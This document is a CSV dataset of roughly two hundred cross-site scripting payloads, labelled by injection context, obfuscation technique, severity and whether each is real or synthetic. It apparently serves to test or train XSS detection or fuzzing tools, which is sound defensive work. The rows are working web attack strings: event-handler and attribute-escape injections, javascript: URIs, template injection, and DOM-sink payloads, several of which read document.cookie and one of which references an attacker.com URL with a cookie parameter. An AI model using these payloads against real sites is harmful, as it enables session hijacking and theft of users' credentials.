payload,context,technique,severity,length,source
<button popovertarget=x>Click me</button><thead ontoggle=alert(1) popover id=x>AnonKryptiQuz</thead>,tag_injection,none,medium,100,real
"<optgroup onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</optgroup>",tag_injection,none,medium,75,real
"<div draggable=""true"" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable style=display:block>drop here</sup>",tag_injection,none,medium,123,real
`><img src=x onp&#97;g&#101;hid&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,low,79,synthetic
"<div ondblclick=""alert(1)"">AnonKryptiQuz</div>",tag_injection,none,medium,46,real
"<samp onmouseenter=""alert(1)"">AnonKryptiQuz</samp>",tag_injection,none,medium,50,real
onauxclick=prompt(%27XSS%27),event_handler,synthetic,medium,28,synthetic
<teXtaRea x=Y oNscRolLenD=aLerT('XSS')>,tag_injection,synthetic,medium,39,synthetic
"	onfocusout=console.log(String.fromCharCode(88,83,83))",event_handler,synthetic,high,54,synthetic
ondragover=confirm(location.hash),event_handler,synthetic,medium,33,synthetic
%22 onpagereveal=confirm(document.domain) %22,attribute_escape,synthetic,medium,45,synthetic
%22 onanimationend=confirm(document.domain) %22,attribute_escape,synthetic,medium,47,synthetic
""" on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(1) """,attribute_escape,synthetic,low,61,synthetic
"<hgroup onmousedown=""alert(1)"">AnonKryptiQuz</hgroup>",tag_injection,none,medium,53,real
%27 ><svg onanimationiteration=confirm(%27XSS%27)>,attribute_escape,synthetic,medium,50,synthetic
"<option draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</option>",tag_injection,none,medium,85,real
\%27 ontouchmove=alert(location.hash)//,attribute_escape,synthetic,medium,39,synthetic
"<div draggable=""true"" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable style=display:block>drop here</summary>",tag_injection,none,medium,135,real
"<style>@keyframes slidein {}</style><output style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></output>",tag_injection,none,medium,172,real
"' onerror=alert(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,high,48,synthetic
onpointercancel=javascript:console.log(1),event_handler,synthetic,medium,41,synthetic
<rb id=x tabindex=1 onbeforedeactivate=alert(1)></rb><input autofocus>,tag_injection,none,medium,70,real
' ><svg onclick=confirm('XSS')>,attribute_escape,synthetic,medium,31,synthetic
"""><img src=x onscrollsn&#97;pch&#97;ng&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,low,85,synthetic
<obJecT x=y OntOucHstArt=coNsoLe.Log(loCatIon.haSh)>,tag_injection,synthetic,medium,52,synthetic
%3Canimatemotion x=y onanimationcancel=prompt(1)%3E,tag_injection,synthetic,medium,51,synthetic
"<iframe ongestureend=console.log(String.fromCharCode(88,83,83))/>",tag_injection,synthetic,high,65,synthetic
<template onpointerup=alert(1) style=display:block>AnonKryptiQuz</template>,tag_injection,none,medium,75,real
onpointermove=console.log/***/(document.domain),event_handler,synthetic,low,47,synthetic
<basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>,tag_injection,none,medium,74,real
"<noscript src=x onbeforematch=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,69,synthetic
"OnfUllScrEenChaNge=coNsoLe.Log&#40;STriNg.FroMChArCOde(88,83,83)&#41;",event_handler,synthetic,high,69,synthetic
"\"" onanimationcancel=console.log(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,65,synthetic
<blockquote id=x tabindex=1 onbeforeactivate=alert(1)></blockquote>,tag_injection,none,medium,67,real
"<style>:target {color:red;}</style><object id=x style=""transition:color 1s"" ontransitionstart=alert(1)></object>",tag_injection,none,medium,112,real
%27 ><svg onbeforetoggle=confirm(location.hash)>,attribute_escape,synthetic,medium,48,synthetic
"<div draggable=""true"" contenteditable>drag me</div><img2 ondragover=alert(1) contenteditable style=display:block>drop here</img2>",tag_injection,none,medium,129,real
<!--><base oninput=alert(%27XSS%27)>,tag_injection,synthetic,medium,36,synthetic
"%3Ctr
onpointerrawupdate=alert(location.hash)%3E",tag_injection,synthetic,medium,48,synthetic
"<style>:target {color: red;}</style><colgroup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></colgroup>",tag_injection,none,medium,119,real
"""><Img srC=x onMouSeoVer=prOmpT(dOcuMenT.dOmaIn)>",attribute_escape,synthetic,medium,49,synthetic
'><img src=x onmousewheel=\u0061lert(document.domain)>,attribute_escape,synthetic,low,54,synthetic
%3Cdetails onrepeat=prompt(1) onrepeat=prompt(1)%3E,tag_injection,synthetic,medium,51,synthetic
"""><img src=x onpagehide=console.log(document.domain)>",attribute_escape,synthetic,medium,53,synthetic
%3Cobject x=y onbeforepaste=confirm(document.domain)%3E,tag_injection,synthetic,medium,55,synthetic
"""><animatetransform onpointermove=console.log('XSS')>",tag_injection,synthetic,medium,53,synthetic
""" ><svg ons&#101;l&#101;ct=prompt(1)>",attribute_escape,synthetic,medium,37,synthetic
"<INPUT TYPE=""IMAGE"" SRC=""javascript:javascript:alert(1);"">",js_uri,case_variation,medium,58,real
"<head><base href=""javascript://""></head><body><a href=""/. /,javascript:alert(/AmoloHT/)//#"">XXX</a></body>",js_uri,none,medium,106,real
%3Cbase src=x oninput=alert('XSS')%3E,tag_injection,synthetic,medium,37,synthetic
""" ><svg onrepeat=\u0061lert(location.hash)>",attribute_escape,synthetic,low,43,synthetic
"document.querySelector(%22body%22).innerHTML+=%22fetch(String.fromCharCode(88,83,83))%22",dom_sink,synthetic,high,88,synthetic
{{prompt(document.cookie)}},template_injection,synthetic,high,27,synthetic
 onplaying=console.log(document.domain),event_handler,synthetic,medium,39,synthetic
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=aLerT(dOcuMenT.cOokIe)>""",dom_sink,synthetic,high,68,synthetic
"	ondblclick=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,58,synthetic
"\"" onpopstate=alert(location.hash)//",attribute_escape,synthetic,medium,36,synthetic
%3Canimatemotion ondblclick=console.log(1)%3E,tag_injection,synthetic,medium,45,synthetic
"\"" OncLicK=pRomPt('XSS')//",attribute_escape,synthetic,medium,26,synthetic
 ondr&#97;gst&#97;rt=confirm(1),event_handler,synthetic,medium,31,synthetic
"<blink draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</blink>",tag_injection,none,medium,88,real
ontransitionend=alert(location.hash),event_handler,synthetic,medium,36,synthetic
document.querySelector(%22body%22).innerHTML+=%22eval(document.domain)%22,dom_sink,synthetic,high,73,synthetic
<template oncontextmenu=console.log(1) oncontextmenu=console.log(1)>,tag_injection,synthetic,medium,68,synthetic
"<u onmouseover=""alert(1)"">AnonKryptiQuz</u>",tag_injection,none,medium,43,real
"<meta charset=""x-imap4-modified-utf7"">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>",script_injection,none,low,93,real
"""/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />",js_uri,none,medium,55,real
<xmP/oNtrAnsItiOneNd=AleRt(LocAtiOn.HasH)>,tag_injection,synthetic,medium,42,synthetic
"<style>:target {color: red;}</style><tr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tr>",tag_injection,none,medium,107,real
%22><animatemotion ongesturestart=confirm(1)>,tag_injection,synthetic,medium,45,synthetic
<foRm X=y onWaiTinG=cOnfIrm(1)>,tag_injection,synthetic,medium,31,synthetic
%22 onmouseover=prompt(1) x=%22,attribute_escape,synthetic,medium,31,synthetic
\%27 onpointerrawupdate=alert(location.hash)//,attribute_escape,synthetic,medium,46,synthetic
%3Cbutton x=y ondragenter=alert(location.hash)%3E,tag_injection,synthetic,medium,49,synthetic
<command onpointermove=alert(1) style=display:block>AnonKryptiQuz</command>,tag_injection,none,medium,75,real
""" ><svg onblur=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,low,56,synthetic
onstalled=javascr	ipt:alert(document.domain),event_handler,synthetic,medium,44,synthetic
"<meta HTTP-EQUIV=""Link"" Content=""<http://www.securitycompass.com/xss.css>; REL=stylesheet"">",tag_injection,none,low,91,real
""" ><svG oNdbLclIck=coNfiRm(1)>",attribute_escape,synthetic,medium,30,synthetic
<svg><script>/<@/>alert(1)</script>//INJECTX,script_injection,none,medium,44,real
<time onfocus=alert(1) autofocus tabindex=1>,tag_injection,none,medium,44,real
<s&#101;l&#101;ct x=y onvolum&#101;ch&#97;ng&#101;=consol&#101;.log(1)>,tag_injection,synthetic,low,71,synthetic
""" ><svg onmous&#101;&#101;nt&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,93,synthetic
"s&#101;tTim&#101;out(""confirm('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)"",0)",dom_sink,synthetic,medium,94,synthetic
""" ><svG oNpaGerEveAl=ProMpt(loCatIon.haSh)>",attribute_escape,synthetic,medium,43,synthetic
"' ><svg onplaying=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,55,synthetic
' onkeypress=alert(1) ',attribute_escape,synthetic,medium,23,synthetic
"""'><img src=xxx:x \x0Conerror=javascript:alert(7465)>",js_uri,none,medium,53,real
"<input onbeforepaste=alert(1) value="""" autofocus>",tag_injection,none,medium,49,real
%22 onmouseover=console.log(1) x=%22,attribute_escape,synthetic,medium,36,synthetic
\' OndRagStaRt=ConFirM(1)//,attribute_escape,synthetic,medium,27,synthetic
""" ><svg onanimationiteration=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,71,synthetic
<button popovertarget=x>Click me</button><tbody onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</tbody>,tag_injection,none,medium,106,real
<svgonload=alert(1)>,tag_injection,none,medium,21,real
"<ruby onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</ruby>",tag_injection,none,medium,66,real
JAVASCRIPT:\u0061lert(document.domain),js_uri,synthetic,low,38,synthetic
\' onp&#97;us&#101;=confirm('XSS')//,attribute_escape,synthetic,medium,36,synthetic
%22 onmozfullscreenchange=alert(1) %22,attribute_escape,synthetic,medium,38,synthetic
&#106;avascript:alert(1),js_uri,synthetic,medium,24,synthetic
"<body onUnload body onUnload=""javascript:javascript:alert(9420)""></body onUnload>",js_uri,none,medium,81,real
' ><svg on&#97;nim&#97;tion&#101;nd=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,67,synthetic
%3Caudio onpause=console.log(document.domain)/%3E,tag_injection,synthetic,medium,49,synthetic
'><script>&#97;l&#101;rt(docum&#101;nt.dom&#97;in)</script>,script_injection,synthetic,low,59,synthetic
<button ondragenter=\u0061lert(location.hash)/>,tag_injection,synthetic,low,47,synthetic
"(new Function(""\u0061lert(document.cookie)""))();",dom_sink,synthetic,high,48,synthetic
<math onplaying=console.log('XSS') onplaying=console.log('XSS')>,tag_injection,synthetic,medium,64,synthetic
"OnwEbkItaNimAtiOneNd=ProMpt/**/(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,62,synthetic
"&#101;v&#97;l(""f&#101;tch(docum&#101;nt.cooki&#101;)"")",dom_sink,synthetic,low,54,synthetic
<table x=y ontouchend=prompt(document.domain)>,tag_injection,synthetic,medium,46,synthetic
"%3Cmarquee x=y onpromptdismiss=console.log(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,76,synthetic
<!--><m&#101;t&#97; onpoint&#101;rov&#101;r=confirm(1)>,tag_injection,synthetic,medium,55,synthetic
${{\u0061lert('XSS')}},template_injection,synthetic,low,22,synthetic
"oncontextmenu=javascr	ipt:prompt(String.fromCharCode(88,83,83))",event_handler,synthetic,high,63,synthetic
<anImaTe Src=x OnpAgeShoW=cOnsOle.loG('XSS')>,tag_injection,synthetic,medium,45,synthetic
"<imG
oNreSet=coNsoLe.Log(doCumEnt.doMaiN)>",tag_injection,synthetic,medium,42,synthetic
%22><img src=x onmousewheel=alert(document.domain)>,attribute_escape,synthetic,medium,51,synthetic
"<samp onclick=""alert(1)"" style=display:block>AnonKryptiQuz</samp>",tag_injection,none,medium,65,real
"__proto__[""onprompt&#97;ction""]=consol&#101;.log('XSS')",dom_sink,synthetic,low,55,synthetic
<textarea onpointerover=alert(1) style=display:block>AnonKryptiQuz</textarea>,tag_injection,none,medium,77,real
"onpointerover=alert/**/(String.fromCharCode(88,83,83))",event_handler,synthetic,high,54,synthetic
\' onpromptdismiss=consol&#101;.log('XSS')//,attribute_escape,synthetic,low,44,synthetic
"\"" onend=prompt(location.hash)//",attribute_escape,synthetic,medium,32,synthetic
<obJecT oNanImaTioNcaNceL=aLerT(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,49,synthetic
<button popovertarget=x>Click me</button><h1 onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</h1>,tag_injection,none,medium,100,real
"DatA:tExt/htMl,<scRipT>cOnsOle.loG(dOcuMenT.dOmaIn)</sCriPt>",js_uri,synthetic,medium,60,synthetic
"\"" OncAnpLay=coNfiRm(StrIng.frOmCHarCodE(88,83,83))//",attribute_escape,synthetic,high,53,synthetic
'><img src=x onmous&#101;wh&#101;&#101;l=prompt(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,74,synthetic
<embed/onmouseenter=confirm(%27XSS%27)>,tag_injection,synthetic,medium,39,synthetic
""" onpopstate=\u0061lert(document.domain) """,attribute_escape,synthetic,low,42,synthetic
<&#97;nim&#97;t&#101;motion	on&#97;nim&#97;tionc&#97;nc&#101;l=prompt(1)>,tag_injection,synthetic,medium,73,synthetic
"<div draggable=""true"" contenteditable>drag me</div><wbr ondragover=alert(1) contenteditable style=display:block>drop here</wbr>",tag_injection,none,medium,127,real
"<span
oncopy=prompt(location.hash)>",tag_injection,synthetic,medium,35,synthetic
"<style>@keyframes slidein {}</style><audio2 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></audio2>",tag_injection,none,medium,172,real
' ><svg ongestureend=confirm('XSS')>,attribute_escape,synthetic,medium,36,synthetic
"""><ScrIpt>coNsoLe.Log('XSS')</ScrIpt>",script_injection,synthetic,medium,37,synthetic
"element.setAttribute(""onclick"",""confirm(1)"")",dom_sink,synthetic,medium,44,synthetic
"""><Img srC=x onMouSeuP=pRomPt(DocUmeNt.DomAin)>",attribute_escape,synthetic,medium,47,synthetic
"<base
onkeydown=alert('XSS')>",tag_injection,synthetic,medium,29,synthetic
 ontransitionstart=console.log(%27XSS%27),event_handler,synthetic,medium,41,synthetic
"<animatemotion onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</animatemotion>",tag_injection,none,medium,87,real
"<listing onmousemove=""alert(1)"">AnonKryptiQuz</listing>",tag_injection,none,medium,55,real
OncAnpLay=jaVasCriPt:ConSolE.lOg('XSS'),event_handler,synthetic,medium,39,synthetic
"<x title""=""&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;"">",attribute_escape,none,medium,73,real
' oNinValId=AleRt(DocUmeNt.DomAin) ',attribute_escape,synthetic,medium,36,synthetic
OnsCroLlsNapChaNge=coNsoLe.Log&#40;lOcaTioN.hAsh&#41;,event_handler,synthetic,low,53,synthetic
	onMouSeuP=cOnfIrm(doCumEnt.doMaiN),event_handler,synthetic,medium,35,synthetic
<marquee onpopstate=\u0061lert('XSS') onpopstate=\u0061lert('XSS')>,tag_injection,synthetic,low,67,synthetic
""" ><svg onst&#97;ll&#101;d=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,84,synthetic
"JavAscRipT:cOnsOle.loG/**/(StrIng.frOmCHarCodE(88,83,83))",js_uri,synthetic,high,57,synthetic
""" onfocus=prompt(location.hash) autofocus=""",attribute_escape,synthetic,medium,43,synthetic
'><Img srC=x onEndEd=ConSolE.lOg(1)>,attribute_escape,synthetic,medium,36,synthetic
""" ><svg on&#101;nd&#101;d=consol&#101;.log(1)>",attribute_escape,synthetic,low,46,synthetic
""" onkeypress=\u0061lert(1) """,attribute_escape,synthetic,low,28,synthetic
&quOt; onVolUmeChaNge=coNfiRm('XSS') x=&quOt;,attribute_escape,synthetic,medium,45,synthetic
"<style>@keyframes x{}</style><frameset style=""animation-name:x"" onanimationstart=""alert(1)""></frameset>",tag_injection,none,medium,103,real
"""%3E%3Cimg src=x onhashchange=confirm(document.domain)%3E",attribute_escape,synthetic,medium,57,synthetic
"<listing onmouseover=""alert(1)"">AnonKryptiQuz</listing>",tag_injection,none,medium,55,real
' ><svg oncut=confirm('XSS')>,attribute_escape,synthetic,medium,29,synthetic
"<style>:target {color:red;}</style><area id=x style=""transition:color 1s"" ontransitionend=alert(1)></area>",tag_injection,none,medium,106,real
"__pRotO__[""oNtoUchEnd""]=FetCh(DocUmeNt.CooKie)",dom_sink,synthetic,high,46,synthetic
<imAge x=Y oNchAngE=aLerT(1)>,tag_injection,synthetic,medium,29,synthetic
<sup onfocusout=alert(1) tabindex=1 id=x></sup><input autofocus>,tag_injection,none,medium,64,real
"<&#97;nim&#97;t&#101;motion
on&#97;nim&#97;tionc&#97;nc&#101;l=prompt(1)>",tag_injection,synthetic,medium,73,synthetic
"<option draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</option>",tag_injection,none,medium,65,real
OnaUxcLicK=jAvaScrIpt:coNfiRm(DocUmeNt.DomAin),event_handler,synthetic,medium,46,synthetic
"<img src=""data:image/svg+xml,<svg onload='top[//.source+//ert//.source](document.cookie)'"">",dom_sink,none,high,91,real
<applet contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,60,real
"<form x=y onwebkitfullscreenchange=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,78,synthetic
&quot; onbeforetoggle=console.log(%27XSS%27) x=&quot;,attribute_escape,synthetic,medium,53,synthetic
"<colgroup id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></colgroup>",tag_injection,none,medium,92,real
<td/onmozfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,85,synthetic
\%22 onblur=alert(location.hash)//,attribute_escape,synthetic,medium,34,synthetic
<area	onpageshow=prompt('XSS')>,tag_injection,synthetic,medium,31,synthetic
"onhashchange=confirm&#40;String.fromCharCode(88,83,83)&#41;",event_handler,synthetic,high,59,synthetic
location=%22javascript:alert(btoa(document.cookie))%22,dom_sink,synthetic,high,54,synthetic
\' onwaiting=prompt(document.domain)//,attribute_escape,synthetic,medium,38,synthetic
\%27 onkeypress=alert(1)//,attribute_escape,synthetic,medium,26,synthetic
 onstalled=alert(document.domain),event_handler,synthetic,medium,33,synthetic
"<xsS
oNenD=pRomPt('XSS')>",tag_injection,synthetic,medium,25,synthetic
"`%3E%3Cimg src=x onmouseenter=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,71,synthetic
"<aside onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</aside>",tag_injection,none,medium,63,real
